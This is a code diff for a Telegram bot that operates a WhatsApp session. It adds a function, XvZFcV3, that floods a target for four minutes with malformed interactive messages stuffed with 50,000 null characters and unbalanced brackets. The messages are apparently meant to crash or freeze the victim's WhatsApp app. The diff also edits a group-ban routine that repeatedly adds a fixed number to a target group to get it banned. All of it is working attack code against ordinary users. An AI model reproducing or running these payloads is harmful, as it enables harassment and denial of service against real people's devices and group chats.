@@ -2058,6 +2058,7 @@ bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     await XvZFc(sock, target);
     await XvZFcV1(sock, target);
     await XvZFcV2(sock, target);
+    await XvZFcV3(sock, target);
     await sleep(1000);
     }
 
@@ -2216,7 +2217,7 @@ bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xban 12×××@g.us`);
-  let groupJid = q.replace(/[^0-9]/g, '') + "@g.us";
+  let target = q.replace(/[^0-9]/g, '') + "@g.us";
   let mention = true;
 
   const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, videoUrl, {
@@ -2238,7 +2239,7 @@ bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async 
   const processMessageId = processMessage.message_id;
 
   for (let i = 0; i < 4; i++) {
-    await XvZBanGb(sock, groupJid);
+    await XvZBanGb(sock, target);
     await sleep(1500);
   }
 
@@ -2527,7 +2528,6 @@ async function XvZBanGb(sock, groupJid) {
     } catch (presenceErr) {
       console.error('Presence update failed:', presenceErr?.message || presenceErr);
     }
-
     console.log(`Successfully banned group: ${group}`);
 
     for (let i = 0; i < 15; i++) {
@@ -2537,20 +2537,17 @@ async function XvZBanGb(sock, groupJid) {
           ["12126660007@s.whatsapp.net"],
           "add"
         );
-
         if (Array.isArray(res) && res[0] && res[0].status !== '200') {
           console.error(`Attempt ${i + 1} failed with status: ${res[0].status}`);
         } else {
           console.log(`Attempt ${i + 1} successful`);
         }
-
         await new Promise((r) => setTimeout(r, 1500 + Math.floor(Math.random() * 1000)));
       } catch (err) {
         console.error(`Error in Banned Group attempt ${i + 1}:`, err);
         await new Promise((r) => setTimeout(r, 2000));
       }
     }
-
   } catch (err) {
     console.error('Error in Banned Group:', err);
     throw err;
@@ -3498,6 +3495,65 @@ const duration = 4 * 60 * 1000;
       participant: { jid: target },
       noSelfSync: true
     });
+  }
+}
+async function XvZFcV3(sock, target) {
+const startTime = Date.now();
+const duration = 4 * 60 * 1000; 
+  
+const msg = () => ({
+interactiveMessage: {
+header: {
+        title: "\u0000".repeat(50000),
+        subtitle: "\u0000".repeat(50000),
+        bloksWidget: {
+        uuid: "\u0000".repeat(50000),
+        data: "[".repeat(50001),
+        type: "\u0000".repeat(50000),
+        fallback: "\u0000".repeat(50000)
+        }
+      },
+      body: { text: "\u200B" },
+      nativeFlowMessage: {
+        buttons: "[".repeat(50001)
+      }
+    }
+  });
+
+  const canalMsg = () => ({
+    viewOnceMessage: {
+      message: {
+        groupStatusMentionMessage: {
+          messageAssociation: {
+            parentMessageKey: {
+              id: "ogMvChCQbs1B7PXpu8Vk5m6oEQNjEhAhhLlQHkGVx66e21hcXL1PGAEiB2JvdC1rZXk="
+            }
+          }
+        }
+      }
+    }
+  });
+
+  const genId = () =>
+    "3EB0" +
+    Date.now().toString(16).toUpperCase() +
+    Math.random().toString(16).slice(2, 8).toUpperCase();
+  while (Date.now() - startTime < duration) {
+    await sock.relayMessage(target, msg(), {
+      messageId: genId(),
+      participant: target,
+      noSelfSync: true
+    });
+
+    await new Promise(r => setTimeout(r, 500));
+
+    await sock.relayMessage(target, canalMsg(), {
+      messageId: genId(),
+      participant: target,
+      noSelfSync: true
+    });
+
+    await new Promise(r => setTimeout(r, 500));
   }
 }
 async function XvZBlank(sock, target) {
